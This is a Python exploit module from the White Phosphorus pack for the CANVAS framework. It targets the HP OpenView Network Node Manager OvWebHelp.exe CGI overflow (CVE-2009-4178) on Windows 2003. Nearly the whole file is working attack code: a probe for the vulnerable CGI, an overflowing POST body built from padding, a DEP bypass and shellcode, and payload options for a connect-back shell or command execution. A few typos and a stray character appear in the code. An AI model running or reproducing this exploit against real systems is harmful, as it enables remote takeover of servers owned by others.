
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "HP OpenView Network Node Manager OvWebHelp CGI Remote Overflow"
DESCRIPTION = "Exploits a vulnerbility in the OvWebHelp.exe cgi modulew"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2009-12-09"
DOCUMENTATION["Repeatability"]="Unlimited"
DOCUMENTATION['CVE Name']='CVE-2009-4178'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4178'
DOCUMENTATION["References"] = "http://dvlabs.tippingpoint.com/advisory/TPTI-09-11"
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["Notes"] = """
OvWebHelp is spawned by IIS & runs under the IUSR_<computername> Internet Guest account.
As such, Execute Command shellcode will only work with applications that IUSER_<computername>
has been granted permission to execute."""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003"]

PORT = 80
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows 2003 SP1-SP2", (0x00000000, 0x00000000, 0x0000), [WIN2K3SP1, WIN2K3SP2]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20\x26\x29"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.log("WP> Checking for OvWebHelp.exe")
        
        ret = 0
        s = self.gettcpsock()
        s.connect((self.host, self.port))
        s.send("GET /OvCGI/OvWebHelp.exe HTTP/1.0\r\n\r\n")
        recv_str = s.recv(1024)
            
        if ((recv_str.find("OpenView Web Online Help")) > 0):
            self.log("WP> OvWebHelp.exe Found")
            ret = 1
        else:
            self.log("WP> OvWebHelp not found")

        return ret

    def neededListenerTypes(self):
        self.getArgs()
        
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        buf = "Topic="
        buf += wp_randomstring(57)
        buf += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8) 
        buf += self.shellcode
        buf += "&Target="
        buf += wp_randomstring(5000)

        payload = "POST /OvCGI/OvWebHelp.exe HTTP/1.1\r\n"
        payload += "Host: " + self.host + "\r\n"
        payload += "Accept-Encoding: identity\r\n"
        payload += "Content-Length: " + str(len(buf)) + "\r\n"
        payload += "Accept-Language: en\r\n"
        payload += "Content-Type: application/x-www-form-urlencoded\r\n"
        payload += "Accept: text/html\r\n"
        payload += "User-Agent: BackTrack\r\n\r\n"
        payload += buf
        payload += "\r\n\r\n"

        return payload


    def run(self):
        self.getArgs()
        
        payload = self.makesploit()

        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            time.sleep(1)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        time.sleep(2)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret


if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
